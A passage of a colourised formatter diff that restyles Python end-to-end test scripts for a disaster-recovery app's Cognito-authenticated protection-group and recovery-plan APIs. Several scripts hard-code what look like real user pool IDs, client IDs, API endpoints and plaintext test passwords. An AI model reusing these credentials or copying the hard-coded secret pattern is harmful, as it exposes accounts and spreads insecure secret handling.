selected_db\u001b[0m\n\u001b[31m-})\u001b[0m\n\u001b[32m+waves_data.append(\u001b[0m\n\u001b[32m+    {\u001b[0m\n\u001b[32m+        \"WaveName\": \"Database\",\u001b[0m\n\u001b[32m+        \"ProtectionGroupId\": pg_map[\"DatabaseServers\"],\u001b[0m\n\u001b[32m+        \"ServerIds\": selected_db,\u001b[0m\n\u001b[32m+    }\u001b[0m\n\u001b[32m+)\u001b[0m\n \n print(\"\\n\ud83d\ude80 Step 3: Creating Recovery Plan 'TEST'...\")\n recovery_plan_data = {\n     \"PlanName\": \"TEST\",\n     \"Description\": \"Test plan for UI verification - 3 waves with actual Protection Groups\",\n\u001b[31m-    \"Waves\": waves_data\u001b[0m\n\u001b[32m+    \"Waves\": waves_data,\u001b[0m\n }\n \n print(f\"\\n\ud83d\udccb Recovery Plan Payload:\")\n print(json.dumps(recovery_plan_data, indent=2))\n \n response = requests.post(\n\u001b[31m-    f'{API_URL}/recovery-plans',\u001b[0m\n\u001b[31m-    headers=headers,\u001b[0m\n\u001b[31m-    json=recovery_plan_data\u001b[0m\n\u001b[32m+    f\"{API_URL}/recovery-plans\", headers=headers, json=recovery_plan_data\u001b[0m\n )\n \n if response.status_code == 201:\n     result = response.json()\n     print(f\"\\n\u2705 SUCCESS! Recovery Plan created:\")\n     print(f\"   Plan ID: {result.get('id', 'N/A')}\")\n     print(f\"   Plan Name: {result.get('name', 'TEST')}\")\n     print(f\"   Waves: {len(result.get('waves', []))}\")\n\u001b[31m-    print(f\"\\n\ud83c\udf10 Check UI at: https://d1wfyuosowt0hl.cloudfront.net/recovery-plans\")\u001b[0m\n\u001b[32m+    print(\u001b[0m\n\u001b[32m+        f\"\\n\ud83c\udf10 Check UI at: https://d1wfyuosowt0hl.cloudfront.net/recovery-plans\"\u001b[0m\n\u001b[32m+    )\u001b[0m\n     print(f\"\\n\u2713 Plan left in system - NOT deleted - you can verify in UI\")\n else:\n     print(f\"\\n\u274c ERROR: Failed to create Recovery Plan\")\n     print(f\"   Status: {response.status_code}\")\n     print(f\"   Response: {response.text}\")\n\u001b[1m--- tests/python/create_test_ui.py\t2025-11-21 02:56:07.793093+00:00\u001b[0m\n\u001b[1m+++ tests/python/create_test_ui.py\t2026-01-02 15:49:03.373193+00:00\u001b[0m\n\u001b[36m@@ -10,54 +10,68 @@\u001b[0m\n USERNAME = \"testuser@example.com\"\n PASSWORD = \"IiG2b1o+D$\"\n \n # Get auth token\n print(\"\ud83d\udd10 Authenticating...\")\n\u001b[31m-cognito = boto3.client('cognito-idp', region_name='us-east-1')\u001b[0m\n\u001b[32m+cognito = boto3.client(\"cognito-idp\", region_name=\"us-east-1\")\u001b[0m\n response = cognito.initiate_auth(\n\u001b[31m-    AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[31m-    AuthParameters={'USERNAME': USERNAME, 'PASSWORD': PASSWORD},\u001b[0m\n\u001b[31m-    ClientId=CLIENT_ID\u001b[0m\n\u001b[32m+    AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n\u001b[32m+    AuthParameters={\"USERNAME\": USERNAME, \"PASSWORD\": PASSWORD},\u001b[0m\n\u001b[32m+    ClientId=CLIENT_ID,\u001b[0m\n )\n\u001b[31m-token = response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[31m-headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}\u001b[0m\n\u001b[32m+token = response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n\u001b[32m+headers = {\u001b[0m\n\u001b[32m+    \"Authorization\": f\"Bearer {token}\",\u001b[0m\n\u001b[32m+    \"Content-Type\": \"application/json\",\u001b[0m\n\u001b[32m+}\u001b[0m\n \n # Get existing Protection Groups\n print(\"\\n\ud83d\udce6 Getting existing Protection Groups...\")\n\u001b[31m-r = requests.get(f'{API_ENDPOINT}/protection-groups', headers=headers)\u001b[0m\n\u001b[32m+r = requests.get(f\"{API_ENDPOINT}/protection-groups\", headers=headers)\u001b[0m\n r.raise_for_status()\n response_data = r.json()\n print(f\"DEBUG Full response: {response_data}\")\n\u001b[31m-all_pgs = response_data.get('groups', [])\u001b[0m\n\u001b[32m+all_pgs = response_data.get(\"groups\", [])\u001b[0m\n print(f\"DEBUG Groups: {all_pgs}\")\n \n # Use WebServers PG only\n if not all_pgs:\n     print(\"\u274c No Protection Groups found!\")\n     exit(1)\n \n web_pg = all_pgs[0]\n\u001b[31m-pg_id = web_pg['protectionGroupId']\u001b[0m\n\u001b[31m-servers = web_pg['sourceServerIds']\u001b[0m\n\u001b[32m+pg_id = web_pg[\"protectionGroupId\"]\u001b[0m\n\u001b[32m+servers = web_pg[\"sourceServerIds\"]\u001b[0m\n print(f\"  \u2713 Using {web_pg['name']}: {pg_id} ({len(servers)} servers)\")\n \n\u001b[31m-# Single wave plan  \u001b[0m\n\u001b[32m+# Single wave plan\u001b[0m\n waves = [\n\u001b[31m-    {\"waveNumber\": 1, \"WaveName\": \"WebTier\", \"ProtectionGroupId\": pg_id, \"ServerIds\": servers}\u001b[0m\n\u001b[32m+    {\u001b[0m\n\u001b[32m+        \"waveNumber\": 1,\u001b[0m\n\u001b[32m+        \"WaveName\": \"WebTier\",\u001b[0m\n\u001b[32m+        \"ProtectionGroupId\": pg_id,\u001b[0m\n\u001b[32m+        \"ServerIds\": servers,\u001b[0m\n\u001b[32m+    }\u001b[0m\n ]\n \n print(\"\\n\ud83d\ude80 Creating 'TEST' Recovery Plan...\")\n\u001b[31m-payload = {\"PlanName\": \"TEST\", \"Description\": \"UI test - 1 wave\", \"Waves\": waves}\u001b[0m\n\u001b[32m+payload = {\u001b[0m\n\u001b[32m+    \"PlanName\": \"TEST\",\u001b[0m\n\u001b[32m+    \"Description\": \"UI test - 1 wave\",\u001b[0m\n\u001b[32m+    \"Waves\": waves,\u001b[0m\n\u001b[32m+}\u001b[0m\n print(f\"DEBUG Payload: {payload}\")\n\u001b[31m-r = requests.post(f'{API_ENDPOINT}/recovery-plans', headers=headers, json=payload)\u001b[0m\n\u001b[32m+r = requests.post(\u001b[0m\n\u001b[32m+    f\"{API_ENDPOINT}/recovery-plans\", headers=headers, json=payload\u001b[0m\n\u001b[32m+)\u001b[0m\n if r.status_code != 201:\n     print(f\"\u274c Error: {r.status_code} - {r.text}\")\n r.raise_for_status()\n plan = r.json()\n print(f\"DEBUG Plan response: {plan}\")\n \n\u001b[31m-plan_id = plan.get('id') or plan.get('planId') or plan.get('recoveryPlanId')\u001b[0m\n\u001b[32m+plan_id = plan.get(\"id\") or plan.get(\"planId\") or plan.get(\"recoveryPlanId\")\u001b[0m\n print(f\"\\n\u2705 SUCCESS! Plan created\")\n print(f\"   Plan ID: {plan_id}\")\n print(f\"   Plan Name: {plan.get('name', plan.get('planName', 'TEST'))}\")\n print(f\"\\n\ud83c\udf10 View in UI: https://d1wfyuosowt0hl.cloudfront.net/recovery-plans\")\n print(f\"\\n\u2713 Plan 'TEST' is now in the system - NOT deleted\")\n\u001b[1m--- tests/python/e2e/get_auth_token.py\t2025-11-21 02:56:07.496052+00:00\u001b[0m\n\u001b[1m+++ tests/python/e2e/get_auth_token.py\t2026-01-02 15:49:03.380040+00:00\u001b[0m\n\u001b[36m@@ -7,46 +7,45 @@\u001b[0m\n import json\n import boto3\n from botocore.exceptions import ClientError\n \n # Cognito Configuration (from .env.test or CloudFormation outputs)\n\u001b[31m-USER_POOL_ID = os.getenv('USER_POOL_ID', 'us-east-1_tj03fVI31')\u001b[0m\n\u001b[31m-CLIENT_ID = os.getenv('CLIENT_ID', '7l8f5q9llq1qjbbte3u8f6pfbh')\u001b[0m\n\u001b[31m-USERNAME = os.getenv('TEST_USERNAME', 'testuser@example.com')\u001b[0m\n\u001b[31m-PASSWORD = os.getenv('TEST_PASSWORD', 'IiG2b1o+D$')\u001b[0m\n\u001b[32m+USER_POOL_ID = os.getenv(\"USER_POOL_ID\", \"us-east-1_tj03fVI31\")\u001b[0m\n\u001b[32m+CLIENT_ID = os.getenv(\"CLIENT_ID\", \"7l8f5q9llq1qjbbte3u8f6pfbh\")\u001b[0m\n\u001b[32m+USERNAME = os.getenv(\"TEST_USERNAME\", \"testuser@example.com\")\u001b[0m\n\u001b[32m+PASSWORD = os.getenv(\"TEST_PASSWORD\", \"IiG2b1o+D$\")\u001b[0m\n \n \n def get_id_token():\n     \"\"\"Authenticate with Cognito and get ID token.\"\"\"\n     try:\n\u001b[31m-        client = boto3.client('cognito-idp', region_name='us-east-1')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        client = boto3.client(\"cognito-idp\", region_name=\"us-east-1\")\u001b[0m\n\u001b[32m+\u001b[0m\n         response = client.initiate_auth(\n             ClientId=CLIENT_ID,\n\u001b[31m-            AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[31m-            AuthParameters={\u001b[0m\n\u001b[31m-                'USERNAME': USERNAME,\u001b[0m\n\u001b[31m-                'PASSWORD': PASSWORD\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[32m+            AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n\u001b[32m+            AuthParameters={\"USERNAME\": USERNAME, \"PASSWORD\": PASSWORD},\u001b[0m\n         )\n\u001b[31m-        \u001b[0m\n\u001b[31m-        id_token = response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        id_token = response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n         return id_token\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     except ClientError as e:\n         print(f\"\u274c Authentication failed: {e}\")\n         return None\n \n \n if __name__ == \"__main__\":\n     print(\"Getting ID token for E2E testing...\")\n     token = get_id_token()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     if token:\n         print(f\"\u2705 ID Token retrieved successfully\")\n         print(f\"\\nSet environment variable:\")\n         print(f\"export ID_TOKEN='{token}'\")\n         print(f\"\\nOr run tests directly:\")\n\u001b[31m-        print(f\"ID_TOKEN='{token}' python tests/python/e2e/test_recovery_plan_bugs.py\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"ID_TOKEN='{token}' python tests/python/e2e/test_recovery_plan_bugs.py\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n     else:\n         print(\"\u274c Failed to get ID token\")\n         exit(1)\n\u001b[1m--- tests/python/e2e/test_protection_groups_fix.py\t2025-11-21 02:56:07.793861+00:00\u001b[0m\n\u001b[1m+++ tests/python/e2e/test_protection_groups_fix.py\t2026-01-02 15:49:03.391656+00:00\u001b[0m\n\u001b[36m@@ -7,92 +7,96 @@\u001b[0m\n import requests\n import json\n import sys\n \n # Config\n\u001b[31m-USER_POOL_ID = 'us-east-1_S3wvMGaT0'\u001b[0m\n\u001b[31m-CLIENT_ID = '31jqv7bghmie564eehjpgqf2tr'\u001b[0m\n\u001b[31m-USERNAME = 'apitest@example.com'\u001b[0m\n\u001b[31m-PASSWORD = 'ApiTest123!'\u001b[0m\n\u001b[31m-API_ENDPOINT = 'https://19rzo4z35f.execute-api.us-east-1.amazonaws.com/test'\u001b[0m\n\u001b[32m+USER_POOL_ID = \"us-east-1_S3wvMGaT0\"\u001b[0m\n\u001b[32m+CLIENT_ID = \"31jqv7bghmie564eehjpgqf2tr\"\u001b[0m\n\u001b[32m+USERNAME = \"apitest@example.com\"\u001b[0m\n\u001b[32m+PASSWORD = \"ApiTest123!\"\u001b[0m\n\u001b[32m+API_ENDPOINT = \"https://19rzo4z35f.execute-api.us-east-1.amazonaws.com/test\"\u001b[0m\n\u001b[32m+\u001b[0m\n \n def get_auth_token():\n     \"\"\"Get Cognito ID token\"\"\"\n     try:\n\u001b[31m-        client = boto3.client('cognito-idp', region_name='us-east-1')\u001b[0m\n\u001b[32m+        client = boto3.client(\"cognito-idp\", region_name=\"us-east-1\")\u001b[0m\n         response = client.initiate_auth(\n             ClientId=CLIENT_ID,\n\u001b[31m-            AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[31m-            AuthParameters={\u001b[0m\n\u001b[31m-                'USERNAME': USERNAME,\u001b[0m\n\u001b[31m-                'PASSWORD': PASSWORD\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[32m+            AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n\u001b[32m+            AuthParameters={\"USERNAME\": USERNAME, \"PASSWORD\": PASSWORD},\u001b[0m\n         )\n\u001b[31m-        return response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[32m+        return response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n     except Exception as e:\n         print(f\"\u274c Auth failed: {e}\")\n         return None\n \n\u001b[32m+\u001b[0m\n def test_protection_groups_api():\n     \"\"\"Test that Protection Groups API returns SourceServerIds\"\"\"\n     print(\"\\n\ud83e\uddea Testing Protection Groups API...\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Get token\n     token = get_auth_token()\n     if not token:\n         print(\"\u274c Failed to authenticate\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\u2705 Authenticated successfully\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Call API\n\u001b[31m-    headers = {'Authorization': f'Bearer {token}'}\u001b[0m\n\u001b[31m-    response = requests.get(f'{API_ENDPOINT}/protection-groups', headers=headers)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    headers = {\"Authorization\": f\"Bearer {token}\"}\u001b[0m\n\u001b[32m+    response = requests.get(\u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/protection-groups\", headers=headers\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if response.status_code != 200:\n         print(f\"\u274c API call failed: {response.status_code}\")\n         print(f\"   Response: {response.text}\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\u2705 API returned {response.status_code}\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Parse response\n     data = response.json()\n\u001b[31m-    pgs = data.get('groups', []) if isinstance(data, dict) else []\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    pgs = data.get(\"groups\", []) if isinstance(data, dict) else []\u001b[0m\n\u001b[32m+\u001b[0m\n     if not pgs:\n         print(\"\u274c No Protection Groups returned\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\u2705 Found {len(pgs)} Protection Groups\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Check each PG has SourceServerIds\n     all_valid = True\n     for pg in pgs:\n\u001b[31m-        pg_name = pg.get('name') or pg.get('Name') or pg.get('GroupName', 'Unknown')\u001b[0m\n\u001b[31m-        source_servers = pg.get('SourceServerIds') or pg.get('sourceServerIds')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        pg_name = (\u001b[0m\n\u001b[32m+            pg.get(\"name\") or pg.get(\"Name\") or pg.get(\"GroupName\", \"Unknown\")\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        source_servers = pg.get(\"SourceServerIds\") or pg.get(\"sourceServerIds\")\u001b[0m\n\u001b[32m+\u001b[0m\n         if not source_servers:\n             print(f\"\u274c {pg_name}: Missing SourceServerIds field\")\n             all_valid = False\n         elif not isinstance(source_servers, list):\n             print(f\"\u274c {pg_name}: SourceServerIds is not a list\")\n             all_valid = False\n         elif len(source_servers) == 0:\n             print(f\"\u26a0\ufe0f  {pg_name}: SourceServerIds is empty\")\n         else:\n             print(f\"\u2705 {pg_name}: Has {len(source_servers)} servers\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return all_valid\n \n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n     print(\"=\" * 60)\n     print(\"PROTECTION GROUPS API FIX VALIDATION\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     success = test_protection_groups_api()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\" + \"=\" * 60)\n     if success:\n         print(\"\u2705 ALL TESTS PASSED - Protection Groups API working correctly!\")\n         sys.exit(0)\n     else:\n\u001b[1m--- tests/python/e2e/test_protection_group_crud.py\t2025-11-21 02:56:07.793458+00:00\u001b[0m\n\u001b[1m+++ tests/python/e2e/test_protection_group_crud.py\t2026-01-02 15:49:03.437480+00:00\u001b[0m\n\u001b[36m@@ -8,74 +8,74 @@\u001b[0m\n import json\n import sys\n import time\n \n # Config - UPDATE THESE AFTER DEPLOYMENT\n\u001b[31m-USER_POOL_ID = 'us-east-1_jKbDOFre2'  # From stack outputs\u001b[0m\n\u001b[31m-CLIENT_ID = '79e5u9lflt3hvbuug78mg9okn3'      # From stack outputs\u001b[0m\n\u001b[31m-API_ENDPOINT = 'https://n122r4122g.execute-api.us-east-1.amazonaws.com/test'   # From stack outputs\u001b[0m\n\u001b[31m-USERNAME = 'testuser@example.com'\u001b[0m\n\u001b[31m-PASSWORD = 'TestPass123!'\u001b[0m\n\u001b[32m+USER_POOL_ID = \"us-east-1_jKbDOFre2\"  # From stack outputs\u001b[0m\n\u001b[32m+CLIENT_ID = \"79e5u9lflt3hvbuug78mg9okn3\"  # From stack outputs\u001b[0m\n\u001b[32m+API_ENDPOINT = \"https://n122r4122g.execute-api.us-east-1.amazonaws.com/test\"  # From stack outputs\u001b[0m\n\u001b[32m+USERNAME = \"testuser@example.com\"\u001b[0m\n\u001b[32m+PASSWORD = \"TestPass123!\"\u001b[0m\n\u001b[32m+\u001b[0m\n \n def get_auth_token():\n     \"\"\"Get Cognito ID token\"\"\"\n     try:\n\u001b[31m-        client = boto3.client('cognito-idp', region_name='us-east-1')\u001b[0m\n\u001b[32m+        client = boto3.client(\"cognito-idp\", region_name=\"us-east-1\")\u001b[0m\n         response = client.initiate_auth(\n             ClientId=CLIENT_ID,\n\u001b[31m-            AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[31m-            AuthParameters={\u001b[0m\n\u001b[31m-                'USERNAME': USERNAME,\u001b[0m\n\u001b[31m-                'PASSWORD': PASSWORD\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[32m+            AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n\u001b[32m+            AuthParameters={\"USERNAME\": USERNAME, \"PASSWORD\": PASSWORD},\u001b[0m\n         )\n\u001b[31m-        return response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[32m+        return response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n     except Exception as e:\n         print(f\"\u274c Auth failed: {e}\")\n         return None\n \n\u001b[32m+\u001b[0m\n def test_create_protection_group(token):\n     \"\"\"Test POST /protection-groups\"\"\"\n     print(\"\\n\ud83e\uddea Test 1: CREATE Protection Group (POST)\")\n\u001b[31m-    \u001b[0m\n\u001b[31m-    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    headers = {\u001b[0m\n\u001b[32m+        \"Authorization\": f\"Bearer {token}\",\u001b[0m\n\u001b[32m+        \"Content-Type\": \"application/json\",\u001b[0m\n\u001b[32m+    }\u001b[0m\n     data = {\n\u001b[31m-        'GroupName': f'test-pg-{int(time.time())}',\u001b[0m\n\u001b[31m-        'Description': 'Test protection group for CRUD operations',\u001b[0m\n\u001b[31m-        'Region': 'us-east-1',\u001b[0m\n\u001b[31m-        'AccountId': '123456789012',\u001b[0m\n\u001b[31m-        'Owner': 'testuser@example.com',\u001b[0m\n\u001b[31m-        'sourceServerIds': ['s-1234567890abcdef0', 's-1234567890abcdef1']\u001b[0m\n\u001b[31m-    }\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        \"GroupName\": f\"test-pg-{int(time.time())}\",\u001b[0m\n\u001b[32m+        \"Description\": \"Test protection group for CRUD operations\",\u001b[0m\n\u001b[32m+        \"Region\": \"us-east-1\",\u001b[0m\n\u001b[32m+        \"AccountId\": \"123456789012\",\u001b[0m\n\u001b[32m+        \"Owner\": \"testuser@example.com\",\u001b[0m\n\u001b[32m+        \"sourceServerIds\": [\"s-1234567890abcdef0\", \"s-1234567890abcdef1\"],\u001b[0m\n\u001b[32m+    }\u001b[0m\n\u001b[32m+\u001b[0m\n     response = requests.post(\n\u001b[31m-        f'{API_ENDPOINT}/protection-groups',\u001b[0m\n\u001b[31m-        headers=headers,\u001b[0m\n\u001b[31m-        json=data\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/protection-groups\", headers=headers, json=data\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if response.status_code == 200:\n         pg = response.json()\n         print(f\"\u2705 CREATE successful: {pg['id']}\")\n         print(f\"   Name: {pg['name']}\")\n         print(f\"   Servers: {len(pg.get('sourceServerIds', []))}\")\n\u001b[31m-        return pg['id'], pg['name']\u001b[0m\n\u001b[32m+        return pg[\"id\"], pg[\"name\"]\u001b[0m\n     else:\n         print(f\"\u274c CREATE failed: {response.status_code}\")\n         print(f\"   Response: {response.text}\")\n         return None, None\n\u001b[32m+\u001b[0m\n \n def test_get_protection_group(token, pg_id):\n     \"\"\"Test GET /protection-groups/{id}\"\"\"\n     print(f\"\\n\ud83e\uddea Test 2: GET Protection Group (GET /{pg_id})\")\n\u001b[31m-    \u001b[0m\n\u001b[31m-    headers = {'Authorization': f'Bearer {token}'}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    headers = {\"Authorization\": f\"Bearer {token}\"}\u001b[0m\n     response = requests.get(\n\u001b[31m-        f'{API_ENDPOINT}/protection-groups/{pg_id}',\u001b[0m\n\u001b[31m-        headers=headers\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/protection-groups/{pg_id}\", headers=headers\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if response.status_code == 200:\n         pg = response.json()\n         print(f\"\u2705 GET successful\")\n         print(f\"   Name: {pg['name']}\")\n         print(f\"   Servers: {len(pg.get('sourceServerIds', []))}\")\n\u001b[36m@@ -83,84 +83,94 @@\u001b[0m\n     else:\n         print(f\"\u274c GET failed: {response.status_code}\")\n         print(f\"   Response: {response.text}\")\n         return False\n \n\u001b[32m+\u001b[0m\n def test_update_protection_group(token, pg_id):\n     \"\"\"Test PUT /protection-groups/{id}\"\"\"\n     print(f\"\\n\ud83e\uddea Test 3: UPDATE Protection Group (PUT /{pg_id})\")\n\u001b[31m-    \u001b[0m\n\u001b[31m-    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    headers = {\u001b[0m\n\u001b[32m+        \"Authorization\": f\"Bearer {token}\",\u001b[0m\n\u001b[32m+        \"Content-Type\": \"application/json\",\u001b[0m\n\u001b[32m+    }\u001b[0m\n     data = {\n\u001b[31m-        'description': 'Updated description - testing PUT method',\u001b[0m\n\u001b[31m-        'sourceServerIds': ['s-1234567890abcdef0', 's-1234567890abcdef1', 's-1234567890abcdef2'],\u001b[0m\n\u001b[31m-        'tags': [\u001b[0m\n\u001b[31m-            {'key': 'Environment', 'value': 'Test'},\u001b[0m\n\u001b[31m-            {'key': 'Updated', 'value': 'True'}\u001b[0m\n\u001b[31m-        ]\u001b[0m\n\u001b[31m-    }\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        \"description\": \"Updated description - testing PUT method\",\u001b[0m\n\u001b[32m+        \"sourceServerIds\": [\u001b[0m\n\u001b[32m+            \"s-1234567890abcdef0\",\u001b[0m\n\u001b[32m+            \"s-1234567890abcdef1\",\u001b[0m\n\u001b[32m+            \"s-1234567890abcdef2\",\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+        \"tags\": [\u001b[0m\n\u001b[32m+            {\"key\": \"Environment\", \"value\": \"Test\"},\u001b[0m\n\u001b[32m+            {\"key\": \"Updated\", \"value\": \"True\"},\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+    }\u001b[0m\n\u001b[32m+\u001b[0m\n     response = requests.put(\n\u001b[31m-        f'{API_ENDPOINT}/protection-groups/{pg_id}',\u001b[0m\n\u001b[31m-        headers=headers,\u001b[0m\n\u001b[31m-        json=data\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/protection-groups/{pg_id}\", headers=headers, json=data\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if response.status_code == 200:\n         pg = response.json()\n         print(f\"\u2705 UPDATE successful\")\n         print(f\"   Description: {pg['description']}\")\n\u001b[31m-        print(f\"   Servers: {len(pg.get('sourceServerIds', []))} (added 1 server)\")\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"   Servers: {len(pg.get('sourceServerIds', []))} (added 1 server)\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print(f\"   Tags: {len(pg.get('tags', []))} (added 1 tag)\")\n         return True\n     else:\n         print(f\"\u274c UPDATE failed: {response.status_code}\")\n         print(f\"   Response: {response.text}\")\n         return False\n\u001b[32m+\u001b[0m\n \n def test_delete_protection_group(token, pg_id):\n     \"\"\"Test DELETE /protection-groups/{id}\"\"\"\n     print(f\"\\n\ud83e\uddea Test 4: DELETE Protection Group (DELETE /{pg_id})\")\n\u001b[31m-    \u001b[0m\n\u001b[31m-    headers = {'Authorization': f'Bearer {token}'}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    headers = {\"Authorization\": f\"Bearer {token}\"}\u001b[0m\n     response = requests.delete(\n\u001b[31m-        f'{API_ENDPOINT}/protection-groups/{pg_id}',\u001b[0m\n\u001b[31m-        headers=headers\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/protection-groups/{pg_id}\", headers=headers\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if response.status_code == 200:\n         print(f\"\u2705 DELETE successful\")\n         return True\n     else:\n         print(f\"\u274c DELETE failed: {response.status_code}\")\n         print(f\"   Response: {response.text}\")\n         return False\n\u001b[32m+\u001b[0m\n \n def test_name_uniqueness(token, existing_name):\n     \"\"\"Test name uniqueness validation\"\"\"\n     print(f\"\\n\ud83e\uddea Test 5: Name Uniqueness Validation\")\n     print(f\"   Attempting to create PG with existing name: {existing_name}\")\n\u001b[31m-    \u001b[0m\n\u001b[31m-    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    headers = {\u001b[0m\n\u001b[32m+        \"Authorization\": f\"Bearer {token}\",\u001b[0m\n\u001b[32m+        \"Content-Type\": \"application/json\",\u001b[0m\n\u001b[32m+    }\u001b[0m\n     data = {\n\u001b[31m-        'GroupName': existing_name,  # Use existing name - should fail\u001b[0m\n\u001b[31m-        'Description': 'This should fail due to duplicate name',\u001b[0m\n\u001b[31m-        'Region': 'us-east-1',\u001b[0m\n\u001b[31m-        'AccountId': '123456789012',\u001b[0m\n\u001b[31m-        'Owner': 'testuser@example.com',\u001b[0m\n\u001b[31m-        'sourceServerIds': ['s-test123']\u001b[0m\n\u001b[31m-    }\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        \"GroupName\": existing_name,  # Use existing name - should fail\u001b[0m\n\u001b[32m+        \"Description\": \"This should fail due to duplicate name\",\u001b[0m\n\u001b[32m+        \"Region\": \"us-east-1\",\u001b[0m\n\u001b[32m+        \"AccountId\": \"123456789012\",\u001b[0m\n\u001b[32m+        \"Owner\": \"testuser@example.com\",\u001b[0m\n\u001b[32m+        \"sourceServerIds\": [\"s-test123\"],\u001b[0m\n\u001b[32m+    }\u001b[0m\n\u001b[32m+\u001b[0m\n     response = requests.post(\n\u001b[31m-        f'{API_ENDPOINT}/protection-groups',\u001b[0m\n\u001b[31m-        headers=headers,\u001b[0m\n\u001b[31m-        json=data\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/protection-groups\", headers=headers, json=data\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if response.status_code == 400:\n         error = response.json()\n\u001b[31m-        if 'already exists' in error.get('error', '').lower():\u001b[0m\n\u001b[32m+        if \"already exists\" in error.get(\"error\", \"\").lower():\u001b[0m\n             print(f\"\u2705 Name uniqueness validation working\")\n             print(f\"   Correctly rejected duplicate name\")\n             return True\n         else:\n             print(f\"\u26a0\ufe0f  Got 400 but unexpected error: {error.get('error')}\")\n\u001b[36m@@ -169,70 +179,72 @@\u001b[0m\n         print(f\"\u274c Name uniqueness validation FAILED\")\n         print(f\"   Should return 400, got: {response.status_code}\")\n         print(f\"   Duplicate names allowed (BUG!)\")\n         return False\n \n\u001b[32m+\u001b[0m\n def main():\n     \"\"\"Run all CRUD tests\"\"\"\n     print(\"=\" * 60)\n     print(\"Protection Groups CRUD E2E Test Suite\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Check config\n\u001b[31m-    if 'UPDATE_ME' in [USER_POOL_ID, CLIENT_ID, 